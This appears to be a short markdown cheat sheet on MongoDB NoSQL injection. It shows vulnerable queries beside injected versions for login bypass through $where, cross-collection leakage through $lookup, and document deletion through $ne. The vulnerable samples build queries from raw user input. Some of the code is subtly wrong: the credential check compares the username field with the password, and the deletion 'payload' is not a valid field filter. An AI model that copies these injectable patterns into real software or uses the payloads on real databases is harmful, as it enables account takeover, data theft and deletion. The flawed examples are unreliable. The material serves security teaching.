# NoSQL Injection

## Table of Contents
- [Authentication bypass](#authentication-bypass)
- [Data Exfiltration](#data-exfiltration)
- [Data Tampering](#data-tampering)

## Authentication bypass

### The protection implemented in the service can be bypassed.

- Login bypass [^1]
    1. Query that validates credentials
        ```javascript
        users_collection.findOne({ $where: `this.username == '${username}' && this.username == '${password}'` });
        ```

    2. Manipulated query
        ```javascript
        users_collection.findOne({ $where: `this.username == 'admin'||'1'=='123' && this.username == '1'` });
        ```

## Data Exfiltration

### Data from other collections that the developer did not intend to access can be leaked.

- Cross-collection Data Leakage [^1]
    1. Query that fetches items with stock information
        ```javascript
        item_collection.aggregate([{ $lookup: JSON.parse(`{"from":"${lookup}","localField":"stockitem","foreignField":"sku","as":"stockitem_info"}`) }])
        ```

    2. Manipulated query
        ```javascript
        item_collection.aggregate([{ $lookup: JSON.parse(`{"from":"users","localField":"stockitem","foreignField":"sku","as":"stockitem_info"}`) }])
        ```

## Data Tampering

### Attackers can modify or delete unauthorized data.

- Unauthorized Data Modification [^1]
    1. Query that delete a specific document
        ```javascript
        docs_collection.deleteOne({ document_id });
        ```

    2. Manipulated query
        ```javascript
         docs_collection.deleteOne({ "$ne":"2" })
        ```

[^1]: Based on MongoDB